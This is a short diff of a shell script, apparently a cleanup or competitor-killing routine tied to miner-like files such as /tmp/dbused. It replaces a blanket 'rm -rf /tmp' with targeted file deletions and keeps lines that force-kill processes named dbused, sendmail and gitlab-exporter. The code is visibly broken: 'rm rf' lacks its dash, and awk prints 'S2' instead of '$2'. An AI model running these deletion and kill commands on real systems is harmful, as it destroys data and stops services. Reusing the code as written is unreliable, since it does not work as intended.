@@ -120,7 +120,11 @@ do
   rm rf /var/tmp/f41
   rm rf /var/tmp/2.sh
 
-  rm -rf /tmp
+  rm -rf /tmp/dbused
+  rm -rf /tmp/dbuse
+  rm -rf /tmp/dbused1
+  rm -rf /tmp/dbuse1
+  rm -rf /tmp/bashirc
   ps auxf | grep -v grep | grep 'dbused' | awk '{print S2}' | xargs -I % kill -9 %
   ps auxf | grep -v grep | grep 'sendmail' | awk '{print S2}' | xargs -I % kill -9 %
   ps auxf | grep -v grep | grep 'gitlab-exporter' | awk '{print S2}' | xargs -I % kill -9 %
